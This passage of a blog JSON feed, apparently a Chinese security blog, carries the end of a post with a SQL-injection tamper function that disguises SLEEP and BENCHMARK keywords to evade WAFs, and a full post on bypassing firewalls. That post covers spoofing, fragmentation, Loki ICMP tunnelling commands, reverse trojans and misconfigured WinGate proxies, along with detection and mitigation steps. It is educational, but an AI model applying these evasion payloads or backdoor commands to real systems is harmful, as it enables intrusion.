host=&#x27;,&#x27;/*!29440and*/host/*!11440=*/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;BENCHMARK(&#x27;,&#x27;BENCHMARK/*!29440*/(&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;SLEEP(&#x27;,&#x27;sleep/**/(&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">return payload</span><br></pre></td></tr></table></figure>\n<p>fuzz出具体payload后对关键字符进行替换</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E5%9F%BA%E7%A1%80/",
            "url": "http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E5%9F%BA%E7%A1%80/",
            "title": "防火墙绕过基础",
            "date_published": "2021-03-28T10:39:27.000Z",
            "content_html": "<p>现在随着人们的安全意识加强，防火墙一般都被公司企业采用来保障网络的安全，一般的攻击者在有防火墙的情况下，一般是很难入侵的。下面谈谈有防火墙环境下的攻击和检测。</p>\n<h1 id=\"一-防火墙基本原理\"><a class=\"markdownIt-Anchor\" href=\"#一-防火墙基本原理\"></a> 一 防火墙基本原理</h1>\n<p>首先，我们需要了解一些基本的防火墙实现原理。防火墙目前主要分包过滤，和状态检测的包过滤，应用层代理防火墙。但是他们的基本实现都是类似的。</p>\n<p>│ │—路由器-----网卡│防火墙│网卡│----------内部网络│ │</p>\n<p>防火墙一般有两个以上的网络卡，一个连到外部（router)，另一个是连到内部网络。当打开主机网络转发功能时，两个网卡间的网络通讯能直接通过。当有防火墙时，他好比插在网卡之间，对所有的网络通讯进行控制。</p>\n<p>说到访问控制，这是防火墙的核心了：），防火墙主要通过一个访问控制表来判断的，他的形式一般是一连串的如下规则：</p>\n<p>1 accept from+ 源地址，端口 to+ 目的地址，端口+ 采取的动作</p>\n<p>2 deny …（deny就是拒绝。。)</p>\n<p>3 nat …(nat是地址转换。后面说）</p>\n<p>防火墙在网络层（包括以下的炼路层）接受到网络数据包后，就从上面的规则连表一条一条地匹配，如果符合就执行预先安排的动作了！如丢弃包。。。。</p>\n<p>但是，不同的防火墙，在判断攻击行为时，有实现上的差别。下面结合实现原理说说可能的攻击。</p>\n<h1 id=\"二-攻击包过滤防火墙\"><a class=\"markdownIt-Anchor\" href=\"#二-攻击包过滤防火墙\"></a> 二 攻击包过滤防火墙</h1>\n<p>包过滤防火墙是最简单的一种了，它在网络层截获网络数据包，根据防火墙的规则表，来检测攻击行为。他根据数据包的源IP地址；目的IP地址；TCP/UDP源端口；TCP/UDP目的端口来过滤！！很容易受到如下攻击：</p>\n<h2 id=\"1-ip-欺骗攻击\"><a class=\"markdownIt-Anchor\" href=\"#1-ip-欺骗攻击\"></a> 1 ip 欺骗攻击：</h2>\n<p>这种攻击，主要是修改数据包的源，目的地址和端口，模仿一些合法的数据包来骗过防火墙的检测。如：外部攻击者，将他的数据报源地址改为内部网络地址，防火墙看到是合法地址就放行了：）。可是，如果防火墙能结合接口，地址来匹配，这种攻击就不能成功了：（</p>\n<h2 id=\"2-dos拒绝服务攻击\"><a class=\"markdownIt-Anchor\" href=\"#2-dos拒绝服务攻击\"></a> 2 d.o.s拒绝服务攻击</h2>\n<p>简单的包过滤防火墙不能跟踪 tcp的状态，很容易受到拒绝服务攻击，一旦防火墙受到d.o.s攻击，他可能会忙于处理，而忘记了他自己的过滤功能。：）你就可以饶过了，不过这样攻击还很少的。！</p>\n<h2 id=\"3-分片攻击\"><a class=\"markdownIt-Anchor\" href=\"#3-分片攻击\"></a> 3 分片攻击</h2>\n<p>这种攻击的原理是：在IP的分片包中，所有的分片包用一个分片偏移字段标志分片包的顺序，但是，只有第一个分片包含有TCP端口号的信息。当IP分片包通过分组过滤防火墙时，防火墙只根据第一个分片包的Tcp信息判断是否允许通过，而其他后续的分片不作防火墙检测，直接让它们通过。</p>\n<p>这样，攻击者就可以通过先发送第一个合法的IP分片，骗过防火墙的检测，接着封装了恶意数据的后续分片包就可以直接穿透防火墙，直接到达内部网络主机，从而威胁网络和主机的安全。</p>\n<h2 id=\"4-木马攻击\"><a class=\"markdownIt-Anchor\" href=\"#4-木马攻击\"></a> 4 木马攻击</h2>\n<p>对于包过滤防火墙最有效的攻击就是木马了，一但你在内部网络安装了木马，防火墙基本上是无能为力的。</p>\n<p>原因是：包过滤防火墙一般只过滤低端口（1-1024），而高端口他不可能过滤的（因为，一些服务要用到高端口，因此防火墙不能关闭高端口的），所以很多的木马都在高端口打开等待，如冰河，subseven等。。。</p>\n<p>但是木马攻击的前提是必须先上传，运行木马，对于简单的包过滤防火墙来说，是容易做的。这里不写这个了。大概就是利用内部网络主机开放的服务漏洞。<br />\n　　<br />\n　　早期的防火墙都是这种简单的包过滤型的，到现在已很少了，不过也有。现在的包过滤采用的是状态检测技术，下面谈谈状态检测的包过滤防火墙。</p>\n<h1 id=\"三-攻击状态检测的包过滤\"><a class=\"markdownIt-Anchor\" href=\"#三-攻击状态检测的包过滤\"></a> 三 攻击状态检测的包过滤</h1>\n<p>状态检测技术最早是checkpoint提出的，在国内的许多防火墙都声称实现了状态检测技术。</p>\n<p>可是：）很多是没有实现的。到底什么是状态检测？</p>\n<p>一句话，状态检测就是从tcp连接的建立到终止都跟踪检测的技术。</p>\n<p>原先的包过滤，是拿一个一个单独的数据包来匹配规则的。可是我们知道，同一个tcp连接，他的数据包是前后关联的，先是syn包，-》数据包=》fin包。数据包的前后序列号是相关的。<br />\n　<br />\n　　如果割裂这些关系，单独的过滤数据包，很容易被精心够造的攻击数据包欺骗！！！如nmap的攻击扫描，就有利用syn包，fin包，reset包来探测防火墙后面的网络。！</p>\n<p>相反，一个完全的状态检测防火墙，他在发起连接就判断，如果符合规则，就在内存登记了这个连接的状态信息（地址，port，选项。。）,后续的属于同一个连接的数据包，就不需要在检测了。直接通过。而一些精心够造的攻击数据包由于没有在内存登记相应的状态信息，都被丢弃了。这样这些攻击数据包，就不能饶过防火墙了。</p>\n<p>说状态检测必须提到动态规则技术。在状态检测里，采用动态规则技术，原先高端口的问题就可以解决了。实现原理是：平时，防火墙可以过滤内部网络的所有端口(1-65535),外部攻击者难于发现入侵的切入点，可是为了不影响正常的服务，防火墙一但检测到服务必须开放高端口时，如（ftp协议，irc等），防火墙在内存就可以动态地天加一条规则打开相关的高端口。等服务完成后，这条规则就又被防火墙删除。这样，既保障了安全，又不影响正常服务，速度也快。！</p>\n<p>一般来说，完全实现了状态检测技术防火墙，智能性都比较高，一些扫描攻击还能自动的反应，因此，攻击者要很小心才不会被发现。</p>\n<p>但是，也有不少的攻击手段对付这种防火墙的。</p>\n<h2 id=\"1-协议隧道攻击\"><a class=\"markdownIt-Anchor\" href=\"#1-协议隧道攻击\"></a> 1 协议隧道攻击</h2>\n<p>协议隧道的攻击思想类似与VPN的实现原理，攻击者将一些恶意的攻击数据包隐藏在一些协议分组的头部，从而穿透防火墙系统对内部网络进行攻击。</p>\n<p>例如，许多简单地允许ICMP回射请求、ICMP回射应答和UDP分组通过的防火墙就容易受到ICMP和UDP协议隧道的攻击。Loki和lokid（攻击的客户端和服务端）是实施这种攻击的有效的工具。在实际攻击中，攻击者首先必须设法在内部网络的一个系统上安装上lokid服务端，而后攻击者就可以通过loki客户端将希望远程执行的攻击命令（对应IP分组）嵌入在ICMP或UDP包头部，再发送给内部网络服务端lokid，由它执行其中的命令，并以同样的方式返回结果。由</p>\n<p>于许多防火墙允许ICMP和UDP分组自由出入，因此攻击者的恶意数据就能附带在正常的分组，绕过防火墙的认证，顺利地到达攻击目标主机下面的命令是用于启动lokid服务器程序：</p>\n<p>lokid-p–I–vl</p>\n<p>loki客户程序则如下启动：</p>\n<p>loki–d172.29.11.191(攻击目标主机)-p–I–v1–t3</p>\n<p>这样，lokid和loki就联合提供了一个穿透防火墙系统访问目标系统的一个后门。</p>\n<h2 id=\"2-利用ftp-pasv绕过防火墙认证的攻击\"><a class=\"markdownIt-Anchor\" href=\"#2-利用ftp-pasv绕过防火墙认证的攻击\"></a> 2 利用FTP-pasv绕过防火墙认证的攻击</h2>\n<p>FTP-pasv攻击是针对防火墙实施入侵的重要手段之一。目前很多防火墙不能过滤这种攻击手段。如CheckPoint的Firewall-1，在监视FTP服务器发送给客户端的包的过程中，它在每个包中寻找&quot;227&quot;这个字符串。如果发现这种包，将从中提取目标地址和端口，并对目标地址加以验证，通过后，将允许建立到该地址的TCP连接。</p>\n<p>攻击者通过这个特性，可以设法连接受防火墙保护的服务器和服务。详细的描述可见：<a href=\"http://www.checkpoint.com/techsupport/alerts/pasvftp.html%E3%80%82\">http://www.checkpoint.com/techsupport/alerts/pasvftp.html。</a></p>\n<h2 id=\"3-反弹木马攻击\"><a class=\"markdownIt-Anchor\" href=\"#3-反弹木马攻击\"></a> 3 反弹木马攻击</h2>\n<p>反弹木马是对付这种防火墙的最有效的方法。攻击者在内部网络的反弹木马定时地连接外部攻击者控制的主机，由于连接是从内部发起的，防火墙（任何的防火墙）都认为是一个合法的连接，因此基本上防火墙的盲区就是这里了。防火墙不能区分木马的连接和合法的连接。</p>\n<p>但是这种攻击的局限是：必须首先安装这个木马！！！所有的木马的第一步都是关键！！！</p>\n<h1 id=\"四-攻击代理\"><a class=\"markdownIt-Anchor\" href=\"#四-攻击代理\"></a> 四 攻击代理</h1>\n<p>代理是运行在应用层的防火墙，他实质是启动两个连接，一个是客户到代理，另一个是代理到目的服务器。</p>\n<p>实现上比较简单，和前面的一样也是根据规则过滤。由于运行在应用层速度比较慢/1</p>\n<p>攻击代理的方法很多。</p>\n<p>这里就以wingate为例，简单说说了。（太累了）</p>\n<p>WinGate是目前应用非常广泛的一种Windows95/NT代理防火墙软件，内部用户可以通过一台安装有WinGate的主机访问外部网络，但是它也存在着几个安全脆弱点。</p>\n<p>黑客经常利用这些安全漏洞获得WinGate的非授权Web、Socks和Telnet的访问，从而伪装成WinGate主机的身份对下一个攻击目标发动攻击。因此，这种攻击非常难于被跟踪和记录。<br />\n　　<br />\n　　导致WinGate安全漏洞的原因大多数是管理员没有根据网络的实际情况对WinGate代理防火墙软件进行合理的设置，只是简单地从缺省设置安装完毕后就让软件运行，这就给攻击者可乘之机。</p>\n<h2 id=\"1-非授权web访问\"><a class=\"markdownIt-Anchor\" href=\"#1-非授权web访问\"></a> 1 非授权Web访问</h2>\n<p>某些WinGate版本（如运行在NT系统下的2.1d版本）在误配置情况下，允许外部主机完全匿名地访问因特网。因此，外部攻击者就可以利用WinGate主机来对Web服务器发动各种Web攻击（ 如CGI的漏洞攻击等），同时由于Web攻击的所有报文都是从80号Tcp端口穿过的，因此，很难追踪到攻击者的来源。</p>\n<p>检测</p>\n<p>检测WinGate主机是否有这种安全漏洞的方法如下：</p>\n<p>1) 以一个不会被过滤掉的连接（譬如说拨号连接）连接到因特网上。</p>\n<p>2) 把浏览器的代理服务器地址指向待测试的WinGate主机。</p>\n<p>如果浏览器能访问到因特网，则WinGate主机存在着非授权Web访问漏洞。</p>\n<h2 id=\"2-非授权socks访问\"><a class=\"markdownIt-Anchor\" href=\"#2-非授权socks访问\"></a> 2 非授权Socks访问</h2>\n<p>在WinGate的缺省配置中，Socks代理（1080号Tcp端口）同样是存在安全漏洞。与打开的Web代理（80号Tcp端口）一样，外部攻击者可以利用Socks代理访问因特网。</p>\n<p>防范</p>\n<p>要防止攻击WinGate的这个安全脆弱点，管理员可以限制特定服务的捆绑。在多宿主（multi homed）系统上，执行以下步骤以限定如何提供代理服务。</p>\n<p>1选择Socks或WWWProxyServer属性。</p>\n<p>2选择Bindings标签。</p>\n<p>3按下ConnectionsWillBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。</p>\n<p>非授权Telnet访问</p>\n<p>它是WinGate最具威胁的安全漏洞。通过连接到一个误配置的inGate服务器的Telnet服务，攻击者可以使用别人的主机隐藏自己的踪迹，随意地发动攻击。</p>\n<p>检测</p>\n<p>检测WinGate主机是否有这种安全漏洞的方法如下：</p>\n<p>1.使用telnet尝试连接到一台WinGate服务器。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">[root@happy/tmp]#</span><span class=\"bash\">telnet172.29.11.191</span> </span><br><span class=\"line\"></span><br><span class=\"line\">Trying172.29.11.191…. </span><br><span class=\"line\"></span><br><span class=\"line\">Connectedto172.29.11.191. </span><br><span class=\"line\"></span><br><span class=\"line\">Escapecharacteris‘^]&#x27;. </span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">Wingate&gt;</span><span class=\"bash\">10.50.21.5</span> </span><br></pre></td></tr></table></figure>\n<p>2.如果接受到如上的响应文本，那就输入待连接到的网站。</p>\n<p>3.如果看到了该新系统的登录提示符，那么该服务器是脆弱的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Connectedtohost10.50.21.5…Connected </span><br><span class=\"line\"></span><br><span class=\"line\">SunOS5.6 </span><br><span class=\"line\"></span><br><span class=\"line\">Login: </span><br></pre></td></tr></table></figure>\n<p>对策</p>\n<p>防止这种安全脆弱点的方法和防止非授权Socks访问的方法类似。在WinGate中简单地限制特定服务的捆绑就可以解决这个问题。一般来说，在多宿主（multihomed）系统管理员可以通过执行以下步骤来完成：</p>\n<p>1.选择TelnetSever属性。</p>\n<p>2.选择Bindings标签。</p>\n<p>3.按下ConnectionsWillBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。</p>\n<h1 id=\"五-后话\"><a class=\"markdownIt-Anchor\" href=\"#五-后话\"></a> 五 后话</h1>\n<p>有防火墙的攻击不单是上面的一点，我有什么写的不对的，大家指正。</p>\n<p>一直以来，黑客都在研究攻击防火墙的技术和手段，攻击的手法和技术越来越智能化和多样化。但是就黑客攻击防火墙的过程上看，大概可以分为三类攻击。</p>\n<p>第一类攻击防火墙的方法是探测在目标网络上安装的是何种防火墙系统并且找出此防火墙系统允许哪些服务。我们叫它为对防火墙的探测攻击。</p>\n<p>第二类攻击防火墙的方法是采取地址欺骗、TCP序号攻击等手法绕过防火墙的认证机制，从而 对防火墙和内部网络破坏。</p>\n<p>第三类攻击防火墙的方法是寻找、利用防火墙系统实现和设计上的安全漏洞，从而有针对性地发动攻击。这种攻击难度比较大，可是破坏性很大。</p>\n",
            "tags": [
                "安全"
            ]
        }
    ]
}